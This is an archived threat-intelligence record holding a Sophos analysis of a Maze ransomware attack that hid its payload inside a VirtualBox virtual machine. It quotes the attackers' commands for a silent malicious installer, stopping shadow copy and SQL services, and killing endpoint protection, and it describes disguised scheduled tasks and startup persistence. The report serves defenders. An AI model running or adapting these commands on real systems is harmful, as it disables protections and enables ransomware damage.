{
    "id": "bee80662-742a-48a1-8d6d-3651c3208245",
    "created_at": "2023-01-12T15:07:47.562371Z",
    "updated_at": "2025-03-27T02:05:40.540581Z",
    "deleted_at": null,
    "sha1_hash": "f298d088b666bfaa6049b3bc24727e22bd8454b4",
    "title": "2020-09-17 - Maze attackers adopt Ragnar Locker virtual machine technique",
    "authors": "",
    "file_creation_date": "2022-05-27T21:51:28Z",
    "file_modification_date": "2022-05-27T21:51:28Z",
    "file_size": 695873,
    "plain_text": "# Maze attackers adopt Ragnar Locker virtual machine technique\n\n**[news.sophos.com/en-us/2020/09/17/maze-attackers-adopt-ragnar-locker-virtual-machine-technique/](https://news.sophos.com/en-us/2020/09/17/maze-attackers-adopt-ragnar-locker-virtual-machine-technique/)**\n\nSeptember 17, 2020\n\nWhile conducting an investigation into an attack in July in which the attackers repeatedly\nattempted to infect computers with Maze ransomware, analysts with Sophos’ Managed\nThreat Response (MTR) discovered that the attackers had adopted a technique pioneered\nby the threat actors behind Ragnar Locker earlier this year, in which the ransomware payload\nwas distributed inside of a virtual machine (VM).\n\nIn the Maze incident, the threat actors distributed the file-encrypting payload of the\nransomware on the VM’s virtual hard drive (a VirtualBox virtual disk image (.vdi) file), which\nwas delivered inside of a Windows .msi installer file more than 700MB in size. The attackers\nalso bundled a stripped down, 11 year old copy of the VirtualBox hypervisor inside the .msi\nfile, which runs the VM as a “headless” device, with no user-facing interface.\n\n\n-----\n\nThe Maze-delivered virtual machine was running Windows 7, as opposed to the Windows XP\nVM distributed in the Ragnar Locker incident. A threat hunt through telemetry data initially\nindicated the attackers may have been present on the attack target’s network for at least\nthree days prior to the attack beginning in earnest, but subsequent analysis revealed that the\nattackers had penetrated the network at least six days prior to delivering the ransomware\npayload.\n\nThe investigation also turned up several installer scripts that revealed the attackers’ tactics,\nand found that the attackers had spent days preparing to launch the ransomware by building\nlists of IP addresses inside the target’s network, using one of the target’s domain controller\nservers, and exfiltrating data to cloud storage provider Mega.nz.\n\nThe threat actors initially demanded a $15 million ransom from the target of the attack. The\ntarget did not pay the ransom.\n\n## How the attack transpired\n\nSubsequent analysis by the MTR team revealed that the attackers orchestrated the attack\nusing batch files, and made multiple attempts to maliciously encrypt machines on the\nnetwork; The first iteration of ransomware payloads were all copied to the root of the\n%programdata% folder, using the filenames enc.exe, enc6.exe, and network.dll. The\nattackers then created scheduled tasks that would launch the ransomware with names\nbased on variants of Windows Update Security or Windows Update Security Patches.\n\nThe initial attack did not produce the desired result; The attackers made a second attempt,\nwith a ransomware payload named license.exe, launched from the same location. But\nbefore they launched it, they executed a script that disabled Windows Defender’s Real-Time\nMonitoring feature.\n\n\n-----\n\nThe attackers then, once again, executed a command that would create a scheduled task on\neach computer they had copied the license.exe payload to, this time named Google\n**Chrome Security Update, and set it up to run once at midnight (in the local time zone of the**\ninfected computers).\n\nThese detections indicate that the ransomware payloads were being caught and quarantined\non machines protected by Sophos endpoint products before they could cause harm. Sophos\nanalysts started to see detections that indicated the malware was triggering the Cryptoguard\nbehavioral protections of Intercept X. In this case, Cryptoguard was preventing the malware\nfrom encrypting files by intercepting and neutralizing the Windows APIs that the ransomware\nwas attempting to use to encrypt the hard drive.\n\nSo the attackers decided to try a more radical approach for their third attempt.\n\n## Weaponized virtual machine\n\nThe Maze attackers delivered the attack components for the third attack in the form of an\n.msi installer file. Inside of the .msi was an installer for both the 32-bit and 64-bit versions of\nVirtualBox 3.0.4. This version dates back to 2009 and is still branded with its then-publisher’s\nname, Sun Microsystems.\n\nThe .msi also contains a 1.9GB (uncompressed) virtual disk named micro.vdi, which itself\ncontains a bootable partition of Windows 7 SP1, and a file named micro.xml that contains\nconfiguration information for the virtual hard drive and session.\n\nThe root of that virtual disk contained three files associated with the Maze ransomware:\n**preload.bat, vrun.exe, and a file just named payload (with no file extension), which is the**\nactual Maze DLL payload.\n\nThe DLL file has a different, internal name for itself.\n\n\n-----\n\nThe preload.bat file (shown below) modifies the computer name of the virtual machine,\ngenerating a series of random numbers to use as the name, and joins the virtual machine to\nthe network domain of the victim organization’s network using a WMI command-line function.\n\nThe virtual machine was, apparently, configured in advance by someone who knew\nsomething about the victim’s network, because its configuration file (“micro.xml”) maps two\ndrive letters that are used as shared network drives in this particular organization,\npresumably so it can encrypt the files on those shares as well as on the local machine. It\nalso creates a folder in C:\\SDRSMLINK\\ and shares this folder with the rest of the network.\n\nAt some point (it’s unclear when and how, exactly, it accomplished this), the malware also\nwrites out a file named startup_vrun.bat. We found this file in\nc:\\users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Startup, which\nmeans it’s a persistence mechanism that relies on the computer rebooting before the\nattackers launch the malware.\n\nThe script copies the same three files found on the root of the VM disk (the vrun.exe and\npayload DLL binaries, and the preload.bat batch script) to other disks, then issues a\ncommand to shut down the computer immediately. When someone powers the computer on\nagain, the script executes vrun.exe.\n\n\n-----\n\nThe C:\\SDRSMLINK\\ folder location, created when the .msi file first runs, acts as a\nclearinghouse for specific folders the malware wants to track. It’s full of symbolic links\n(symlinks, similar to Windows shortcuts) to folders on the local hard drive.\n\n## The Ragnar Locker connection\n\n\n-----\n\nThe technique used in the third attack is completely different to those used before by the\nthreat actors behind Maze, but the investigators recognized it immediately because the team\nwho responded to this Maze attack are the same team that responded to the Ragnar Locker\nransomware attack, where the technique was first seen.\n\nIn an earlier attack, Ragnar Locker also deployed a virtual machine in an attempt to bypass\nprotection measures\nIn [Sophos’ earlier reporting about Ragnar Locker, we wrote that “Ragnar Locker ransomware](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)\nwas deployed inside an Oracle VirtualBox Windows XP virtual machine. The attack payload\nwas a 122 MB installer with a 282 MB virtual image inside—all to conceal a 49 kB\nransomware executable.” MITRE has subsequently added this technique to its ATT&CK\nframework.\n\nThe Maze attackers took a slightly different approach, using a virtual Windows 7 machine\ninstead of XP. This significantly increased the size of the virtual disk, but also adds some\nnew functionality that wasn’t available in the Ragnar Locker version. The threat actors\nbundled a VirtualBox installer and the weaponized VM virtual drive inside a file named\n**pikujuwusewa.msi. The attackers then used a batch script called starter.bat.to launch the**\nattack from within the VM.\n\nThe virtual machine (VM) that Sophos extracted from the Maze attack shows that this\n(newer) VM is configured in such a way that it allows easy insertion of another ransomware\non the attacker’s ‘builder’ machine. But the cost in terms of size is signficant: The Ragnar\nLocker virtual disk was only a quarter the size of the nearly 2GB virtual disk used in the Maze\nattack—all just to conceal one 494 KB ransomware executable from detection.\n\nRagnar Locker Maze\n\n\nMSI installer 122 MB\n\nOracleVA.msi\n\n\n733 MB\n\npikujuwusewa.msi\n\n\n-----\n\nVirtual Disk Image (VDI) 282 MB\n\nmicro.vdi\n\nRansomware binary in VDI 49 KB\n\nvrun.exe\n\n\n1.90 GB\n\nmicro.vdi\n\n494 KB\n\npayload\n\n\nThe attackers also executed the following commands on the host computer during the Maze\nattack:\n```\ncmd /c msiexec /qn /i \\\\<machine-hosting-malware>\\frs\\pikujuwusewa.msi\n\n```\nThis ran the Microsoft Installer that installs VirtualBox and the virtual hard drive.\n```\nC:\\Windows\\System32\\cmd.exe /C sc stop vss\n\n```\nThey stop the Volume Shadow Copy service; the ransomware itself includes a command to\ndelete existing shadow copies.\n```\nC:\\Windows\\System32\\cmd.exe /C sc stop sql\n\n```\nThey halt SQL services to ensure that they can encrypt any databases.\n```\nC:\\Windows\\System32\\cmd.exe /C taskkill /F /IM SavService.exe\n\n```\nThey attempt to stop Sophos endpoint protection services (which fails).\n```\nC:\\Windows\\System32\\cmd.exe /C sc start VBoxDRV\n\n```\nFinally, they start the VirtualBox service and launch the VM.\n\n## The future of ransomware?\n\nThe Maze threat actors have proven to be adept at adopting the techniques demonstrated to\n[be successful by other ransomware gangs, including the use of extortion as a means to](https://news.sophos.com/en-us/2020/08/04/the-realities-of-ransomware-the-evasion-arms-race/)\nextract payment from victims. As endpoint protection products improve their abilities to\ndefend against ransomware, attackers are forced to expend greater effort to make an endrun around those protections.\n\nSophos endpoint products detect components of this attack as Troj/Ransom-GAV or\n**[Troj/Swrort-EG. Indicators of compromise can be found on the SophosLabs Github.](https://github.com/sophoslabs/IoCs/blob/master/Ransomware-Maze.csv)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-17 - Maze attackers adopt Ragnar Locker virtual machine technique.pdf"
    ],
    "report_names": [
        "2020-09-17 - Maze attackers adopt Ragnar Locker virtual machine technique.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536067,
    "ts_updated_at": 1743041140,
    "ts_creation_date": 1653688288,
    "ts_modification_date": 1653688288,
    "files": {
        "pdf": "https://archive.orkl.eu/f298d088b666bfaa6049b3bc24727e22bd8454b4.pdf",
        "text": "https://archive.orkl.eu/f298d088b666bfaa6049b3bc24727e22bd8454b4.txt",
        "img": "https://archive.orkl.eu/f298d088b666bfaa6049b3bc24727e22bd8454b4.jpg"
    }
}